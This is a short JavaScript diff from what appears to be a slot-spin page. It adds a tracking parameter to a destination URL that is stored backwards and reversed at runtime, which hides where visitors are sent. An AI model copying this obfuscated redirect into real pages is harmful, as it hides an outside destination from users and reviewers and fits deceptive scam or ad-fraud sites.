@@ -2,7 +2,7 @@ var count_spins = 0;
 var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
-var go_url = '/nitposc/w/ten.ndc-dw//:sptth';
+var go_url = '146907892909224=xp?/nitposc/w/ten.ndc-dw//:sptth';
 var new_url = go_url.split("").reverse().join("");
 
 $(document).ready(function() {
